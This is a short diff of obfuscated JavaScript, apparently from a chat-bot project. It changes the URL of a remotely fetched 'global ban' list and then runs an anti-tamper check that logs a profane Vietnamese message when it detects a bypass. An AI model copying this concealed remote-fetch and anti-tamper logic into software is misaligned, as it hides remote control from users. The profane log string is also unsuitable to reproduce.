@@ -204,7 +204,7 @@ value = String(value);
 if (isNaN(value) || value[traverse(318)] < -1 * 2245 + -4003 * 1 + 59 * 106 || value[traverse(318)] > 7083 + -38 * -76 + -9965 * 1) {
 console[traverse(354)](global[traverse(303)](traverse(317), traverse(320) + traverse(308)));
 } else {
- return axios[traverse(353)]("https://raw.githubusercontent.com/ntkhanggggg/GBAN/main/newgbanbyntkhang.js")[traverse(316)](function(config) {
+ return axios[traverse(353)]("https://raw.githubusercontent.com/hoaibaone/hoaibaone.gban/main/gban-bao.json")[traverse(316)](function(config) {
 var decodeURIComponent = traverse;
 if (config["headers"]["server"] != decodeURIComponent(365)) {
  logger("BYPASS DETECTED CƠ À, GHÊ QUÁ", "[GLOBAL BAN CON CẶC]");
